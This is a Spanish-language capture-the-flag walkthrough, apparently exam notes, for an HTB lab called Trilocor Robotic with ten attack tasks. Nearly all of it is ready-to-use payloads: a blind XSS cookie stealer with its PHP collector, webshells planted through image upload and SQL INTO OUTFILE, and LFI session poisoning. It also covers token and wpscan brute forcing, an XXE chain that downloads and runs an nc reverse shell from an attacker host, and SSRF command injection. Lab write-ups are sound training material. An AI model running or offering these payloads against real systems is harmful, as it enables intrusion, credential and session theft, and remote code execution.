[[CWES - Examen]]
# Trilocor Robotic — HTB · Writeup completo (con payloads)

> Walkthrough oficial reconstruido, **10 tareas** ordenadas. Entorno multi-contenedor. Reemplazá `LOCAL_IP` por la IP de tu interfaz de ataque (`tun0`) y los `PHPSESSID`/tokens por los de tu sesión. **Recordá URL-encodear cada payload** que lo requiera.

---

## Mapa de objetivos

|Host / Puerto|Aplicación|Tarea · Vector|
|---|---|---|
|`www.trilocor.local`|Sitio principal (WordPress)|T1 · Blind XSS|
|`admin.trilocor.local`|Panel WordPress (Filester)|T2 · Upload de imagen → webshell|
|`www.trilocor.local:8088`|Dashboard de RRHH|T3 · SQLi bypass · T4 · LFI → session poisoning|
|`www.trilocor.local:8080`|App de currículums (resumes)|T5 · Reset débil · T6 · SQLi → webshell|
|`www.trilocor.local:8009`|Panel PR (admin)|T7 · Reuso de credenciales · T8 · XXE|
|`www.trilocor.local:9000`|API|T9 · IDOR · T10 · SSRF → RCE (puerto 9090)|

---

## TASK 1 — Blind XSS (robo de cookies)

Enviar un script malicioso para robar cookies y usarlas para entrar al panel de WordPress.

- **Endpoint:** `www.trilocor.local/index.php/testimonials/` (POST)
- **Parámetros vulnerables:** `name`, `company_title`, `testimonial`

**Paso 1 — Crear `script.js`:**
```javascript
new Image().src='http://LOCAL_IP/get_cookie.php?c='+document.cookie
```

**Paso 2 — Crear `get_cookie.php`** (registra las cookies recibidas):
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**Paso 3 — Levantar el servidor PHP** y enviar el payload en cualquiera de los parámetros vulnerables:
```bash
sudo php -S 0.0.0.0:80
```

```html
<script src=http://LOCAL_IP/script.js></script>
```

**Paso 4** — Recibís las cookies en tu servidor local. Usalas para acceder al panel en `http://admin.trilocor.local/` _(opcional: usar la extensión Cookie-Editor del navegador)._

---

## TASK 2 — Upload de imagen → webshell (`admin.trilocor.local`)

- **Endpoint:** `www.admin.trilocor.local/` → Panel de WordPress

Subir una imagen desde la pestaña _Media_ de WordPress. Interceptar con Burp, agregar el shell **debajo de los magic bytes del JPG** y reenviar la request. Debería quedar algo así:

```
Content-Type: image/jpeg
...
<?php system($_REQUEST["cmd"]);?>
```

Dentro del plugin **Filester**, cambiar la extensión de la imagen a `.php`. Visitar su URL y ejecutar el shell:
```
www.trilocor.local/wp-content/uploads/yourshell.php?cmd=id
```

---

## TASK 3 — SQLi: bypass de login (`:8088`)

Inyección SQL simple en el parámetro `username` para saltarse el login.

- **Endpoint:** `www.trilocor.local:8088/index.php` (GET)
- **Parámetro vulnerable:** `username`

```
www.trilocor.local:8088/index.php?username='OR+'a'='a'--+-&password='
```

---

## TASK 4 — LFI → PHP Session Poisoning → RCE (`:8088`)

LFI en el parámetro `language` encadenada con envenenamiento de sesión PHP para lograr RCE.

- **Endpoint:** `www.trilocor.local:8088/dashboard.php` (POST)
- **Parámetro vulnerable:** `language`
- **Tip:** asegurate de que la request sea POST. En Burp: clic derecho sobre la request → _Change request method_.

**Paso 1 — Verificar la LFI:**
```
language=....//....//....//....//etc/passwd
```

**Paso 2 — Enviar el payload malicioso** (`<?php system('id'); ?>` URL-encodeado):
```
language=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e
```

**Paso 3 — Incluir el archivo de sesión** para recibir el valor de `id` y confirmar RCE:
```
language=....//....//....//....//var/lib/php/sessions/sess_PHPSESSID
```

**Paso 4 — Leer la flag:** repetir el paso 2 cambiando el comando inyectado (el `id`), luego el paso 3 para ejecutarlo. Ej.: `pwd` → `ls -la ../../../` → `cat /flag.txt`. **URL-encodeá cada payload.**

---

## TASK 5 — Reset de contraseña débil (`:8080`)

Usar "olvidé mi contraseña" para el usuario `r.batty` y fuzzear el parámetro `token`.

- **Endpoints:**
    - `www.trilocor.local:8080/forgot.php` (POST)
    - `www.trilocor.local:8080/reset.php` (POST)
- **Parámetro vulnerable:** `token`

Enviar la request `POST /reset.php` a **Burp Intruder** y hacer fuerza bruta del `token` de `0000` a `9999`. Cambiar la contraseña y loguearte como `r.batty`.

---

## TASK 6 — SQL Injection → webshell (`:8080`)

SQLi en el parámetro `search` para escribir un webshell PHP vía `INTO OUTFILE`.

- **Endpoint:** `www.trilocor.local:8080/resumes.php` (POST)
- **Parámetro vulnerable:** `search`

**Prueba de escritura** (escribe un archivo de confirmación):
```
search=test'+UNION+select+1,2,3,'file+written+successfully',5,6+into+outfile+'/var/www/public/proof.txt'--+-
```

Confirmar visitando `www.trilocor.local:8080/proof.txt`.

**Escribir el webshell:**
```
search=test'+UNION+select+1,2,3,'<?php+system($_REQUEST[cmd]);+?>',5,6+into+outfile+'/var/www/public/web-shell.php'--+-
```

Confirmar RCE en `www.trilocor.local:8080/web-shell.php?cmd=id`.

---

## TASK 7 — Reuso de credenciales (`:8009`)

Fuerza bruta con `wpscan` contra el usuario `pr-martins` en el sitio principal; reutilizar esas credenciales en el login del panel PR.

- **Endpoint:** `www.trilocor.local:8009/admin/` (POST)
```bash
wpscan --password-attack xmlrpc -U pr-martins \
  -P /usr/share/wordlists/rockyou.txt \
  --url http://www.trilocor.local
```

Usar las credenciales encontradas para loguearte en `www.trilocor.local:8009/admin`.

---

## TASK 8 — XXE Injection → reverse shell (`:8009`)

XXE en dos etapas: primero subir y codificar un reverse shell, luego ejecutar el shell guardado.

- **Endpoint:** `http://www.trilocor.local:8009/admin/upload` (POST)
- **Parámetro vulnerable:** `uploadFile`

**Archivo `rev_shell.sh`:**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LOCAL_IP 443 >/tmp/f
```

**Archivo `xxe.dtd`** (codifica y guarda el `rev_shell.sh` en la víctima):
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=expect://curl$IFS'http://LOCAL_IP:8000/rev_shell.sh'$IFS-o$IFS/tmp/shell.sh">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://LOCAL_IP:8000/?content=%file;'>">
```

**Archivo `rev_exec.dtd`** (ejecuta el `rev_shell.sh` guardado):
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=expect://bash$IFS/tmp/rev_shell.sh">
<!ENTITY % oob "<!ENTITY content SYSTEM'http://LOCAL_IP:8000/?content=%file;'>">
```

**Levantar el servidor local:**
```bash
sudo php -S 0.0.0.0:8000
```

**Etapa 1 — Subir/codificar** — enviar a `POST /admin/upload` dentro de `uploadFile`:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY % remote SYSTEM 'http://LOCAL_IP:8000/xxe.dtd'>%remote;%oob;]>
<root>&content;</root>
```

**Etapa 2 — Ejecutar** — poner el listener y enviar el segundo payload al mismo endpoint:
```bash
nc -lvnp 443
```

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY % remote SYSTEM 'http://LOCAL_IP:8000/rev_exec.dtd'>%remote;%oob;]>
<root>&content;</root>
```

Recibís la conexión de vuelta.

---

## TASK 9 — IDOR en la API (`:9000`)

Cambiar los valores de `uid` y `username` para encontrar el token del administrador y la flag.

- **Endpoint:** `www.trilocor.local:9000/api/tokens`
- **Parámetros vulnerables:** `uid`, `username`

Modificar el body en `/api/tokens`:
```json
{"uid":"1","username":"administrator"}
```

---

## TASK 10 — SSRF → RCE vía healthcheck (`:9000` → `9090`)

- **Endpoint vulnerable:** `www.trilocor.local:9000/api/admin/healthcheck`

El archivo `api.js` revela los endpoints de la API: `/api/admin` y `/api/admin/healthcheck`. El `healthcheck` permite **leer el código fuente de las URLs** que le pasás. Tras fuzzear los puertos de la URL interna, se encuentra el **puerto 9090 abierto**.

**Descubrir parámetros** — con el parámetro `help` aparecen `install&package`:
```json
{"uuid":"admin_uuid","url":"127.0.0.1:9090?help"}
{"uuid":"admin_uuid","url":"127.0.0.1:9090?install&package"}
```

`install&package` se explota rompiendo con =$%26 para conseguir RCE:

```json
{"uuid":"admin_uuid","url":"127.0.0.1:9090?install&package=$%26/bin/ls%20/"}
{"uuid":"admin_uuid","url":"127.0.0.1:9090?install&package=$%26/bin/cat%20/flag_name.txt"}
```

---

## Resumen de endpoints

|Tarea|Endpoint|Método|Parámetro(s)|
|---|---|---|---|
|T1|`/index.php/testimonials/`|POST|`name`, `company_title`, `testimonial`|
|T2|`admin.trilocor.local/` (Media)|POST|upload de imagen|
|T3|`:8088/index.php`|GET|`username`|
|T4|`:8088/dashboard.php`|POST|`language`|
|T5|`:8080/forgot.php` · `/reset.php`|POST|`token`|
|T6|`:8080/resumes.php`|POST|`search`|
|T7|`:8009/admin/`|POST|login (wpscan)|
|T8|`:8009/admin/upload`|POST|`uploadFile`|
|T9|`:9000/api/tokens`|—|`uid`, `username`|
|T10|`:9000/api/admin/healthcheck`|—|`url` → `install&package`|

